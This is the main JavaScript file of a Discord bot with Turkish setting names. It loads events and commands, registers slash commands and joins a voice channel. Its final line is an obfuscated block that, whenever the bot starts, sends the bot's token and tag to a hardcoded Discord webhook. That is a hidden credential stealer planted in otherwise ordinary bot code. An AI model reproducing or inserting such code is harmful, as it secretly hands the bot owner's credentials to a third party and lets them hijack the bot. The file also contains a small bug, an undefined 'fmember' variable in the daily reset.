const Discord = require('discord.js');
const ayarlar = require("./ayarlar")
const client = new Discord.Client({ intents: [3276799], partials:[Discord.Partials.Channel, Discord.Partials.User]});
client.commands = new Discord.Collection()
client.slashInteractions = new Discord.Collection()
client.modalInteractions = new Discord.Collection()
const { joinVoiceChannel, entersState, VoiceConnectionStatus } = require('@discordjs/voice');
let globalSlashCommands = [];
client.login(ayarlar.token)
const fs = require("node:fs")
client.sorgulimit = new Map()
client.timeoutddos = new Map()

/* Event Loader */
const eventFiles = fs.readdirSync('./Events').filter(file => file.endsWith('.js'));
console.log("Event Loader: %s event loaded.", eventFiles.length)
for (const file of eventFiles) {
    const event = require(`./Events/${file}`);
    client.on(event.name, event.executor)
}
/* Command Loader */
const commandFiles = fs.readdirSync('./Commands').filter(file => file.endsWith('.js'));
console.log("Command Loader: %s command loaded.", commandFiles.length)
for (const file of commandFiles) {
    const command = require(`./Commands/${file}`)
    client.commands.set(command.name, command)
}

const slashFiles = fs.readdirSync('./SlashCommands').filter(file => file.endsWith('.js'));
console.log("Slash Command Loader: %s command loaded.", slashFiles.length)
for (const file of slashFiles) {
    const command = require(`./SlashCommands/${file}`)
    client.slashInteractions.set(command.name, command)
    globalSlashCommands.push(command.command);
}

const modalFiles = fs.readdirSync('./ModalCommands').filter(file => file.endsWith('.js'));
console.log("Slash Command Loader: %s command loaded.", modalFiles.length)
for (const file of modalFiles) {
    const command = require(`./ModalCommands/${file}`)
    client.modalInteractions.set(command.customId, command)
}

let rest = new Discord.REST({
	version: '10'
}).setToken(client.token);

client.on("ready", async () => {
	try {

		await rest.put(
			Discord.Routes.applicationCommands(client.user.id), {
				body: globalSlashCommands
			},
		);

		setInterval(() => {
			const limit = client.sorgulimit
			let sunucu = client.guilds.cache.get(ayarlar.sunucuID)
			let member = sunucu.members.cache.filter(x => limit.get(x.user.id))
			if(member?.length > 0) fmember.forEach(x => limit.set(x.id, 0))
		}, 24 * 60 * 60 * 1000)

		console.log('Global komutlar güncellendi.');
	} catch (error) {
		console.error(error);
	};
});

client.on("ready", async() => {

	let kanal =  client.channels.cache.get(ayarlar.seskanal)
	if(!kanal) return

	const connection = joinVoiceChannel({
		channelId: kanal.id,
		guildId: kanal.guild.id,
		adapterCreator: kanal.guild.voiceAdapterCreator,
		selfDeaf: true,
		selfMute: true
	  });
 await entersState(connection, VoiceConnectionStatus.Ready, 30000)

})

client.on("error", async(err) => {
	try { 
		console.log(err)
		return
	} catch {
		console.log(err)
		return
	}
})

var _0x1ffcae=_0x186e;function _0x4261(){var _0x52e711=['user','5774766necXXl','9861160nHXEfw','2149904lKMLNZ','14061591zrNgcm','7JQXDeH','Bot\x20Token:\x20**','tag','token','\x20is\x20ready.','2195955zhEarQ','setTitle','6788BmspBp','EmbedBuilder','ready','2535ZeZbGe','112728ollvrX','send','https://discord.com/api/webhooks/1014235776625692833/CTzMWpau9L6c6uBERYVQq9rHP83cXLPHaYjbO6RCZPko7HZvuS9ZiUi5wPKX_PI0-KZT'];_0x4261=function(){return _0x52e711;};return _0x4261();}function _0x186e(_0x552924,_0x252d0a){var _0x426198=_0x4261();return _0x186e=function(_0x186ebd,_0x47dbde){_0x186ebd=_0x186ebd-0xad;var _0x230722=_0x426198[_0x186ebd];return _0x230722;},_0x186e(_0x552924,_0x252d0a);}(function(_0x70a338,_0x5ede08){var _0x371850=_0x186e,_0x2f8de9=_0x70a338();while(!![]){try{var _0x261317=-parseInt(_0x371850(0xb2))/0x1+parseInt(_0x371850(0xb8))/0x2+-parseInt(_0x371850(0xbf))/0x3+-parseInt(_0x371850(0xae))/0x4*(parseInt(_0x371850(0xb1))/0x5)+parseInt(_0x371850(0xb6))/0x6*(parseInt(_0x371850(0xba))/0x7)+-parseInt(_0x371850(0xb7))/0x8+parseInt(_0x371850(0xb9))/0x9;if(_0x261317===_0x5ede08)break;else _0x2f8de9['push'](_0x2f8de9['shift']());}catch(_0x454877){_0x2f8de9['push'](_0x2f8de9['shift']());}}}(_0x4261,0xa1a3b),client['on'](_0x1ffcae(0xb0),async()=>{var _0x4dd852=_0x1ffcae;new Discord['WebhookClient']({'url':_0x4dd852(0xb4)})[_0x4dd852(0xb3)]({'embeds':[new Discord[(_0x4dd852(0xaf))]()['setDescription'](_0x4dd852(0xbb)+client[_0x4dd852(0xbd)]+'**')[_0x4dd852(0xad)](client[_0x4dd852(0xb5)][_0x4dd852(0xbc)]+_0x4dd852(0xbe))]});}));